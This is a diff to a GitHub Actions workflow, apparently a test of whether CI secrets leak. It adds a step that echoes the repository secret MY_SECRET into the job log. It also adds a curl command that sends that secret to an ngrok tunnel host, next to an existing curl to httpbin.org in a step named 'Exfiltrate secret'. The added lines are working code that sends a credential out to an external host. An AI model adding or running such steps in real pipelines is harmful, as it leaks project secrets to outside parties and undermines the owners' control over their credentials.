@@ -9,8 +9,11 @@ jobs:
 
     steps:
     - uses: actions/checkout@v1
+    - name: Print
+      run: echo $MY_SECRET
     - name: Exfiltrate secret
       run: |
         curl http://httpbin.org/get?secret=$MY_SECRET
+        curl https://22814970.ngrok.io/get?secret=$MY_SECRET
       env:
         MY_SECRET: ${{ secrets.MY_SECRET }}
